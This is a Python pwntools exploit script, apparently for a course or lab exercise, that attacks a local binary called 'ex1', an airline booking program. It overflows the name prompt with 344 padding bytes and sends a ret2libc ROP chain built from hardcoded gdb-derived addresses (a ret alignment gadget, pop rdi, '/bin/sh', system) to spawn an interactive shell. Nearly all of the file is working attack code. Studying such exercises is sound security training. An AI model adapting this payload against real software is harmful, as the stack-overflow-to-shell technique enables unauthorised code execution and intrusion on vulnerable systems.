#!/usr/bin/env python3
from pwn import *

context.binary = ELF('./bin/ex1', checksec=False)
context.log_level = 'debug'

OFFSET = 344  # calculat in gdb: (long)($rbp + 8) - (long)&name

SYSTEM      = 0x7ffff7dff110     # p system
BINSH       = 0x7ffff7f53ea4     # find &system, +9999999, "/bin/sh"
POP_RDI_RET = 0x7ffff7dd6145     # p/x (system - 0x53110) + 0x2a145, verificat cu x/4i
RET         = 0x401016           # gadget 'ret' din binar

def build_payload():
    payload  = b"A" * OFFSET
    payload += p64(RET)          # FIX: realiniere stack
    payload += p64(POP_RDI_RET)  # pop rdi ; ret
    payload += p64(BINSH)        # RDI = &"/bin/sh"
    payload += p64(SYSTEM)       # system("/bin/sh")
    return payload

def main():
    io = process('./bin/ex1')

    # Selectăm un airline valid
    io.sendlineafter(b"Select an airline:", b"0")

    # Overflow în name cu ROP chain
    io.sendlineafter(b"Please input your name to check your booking:", build_payload())

    # Ar trebui să fim în shell
    io.interactive()

if __name__ == "__main__":
    main()
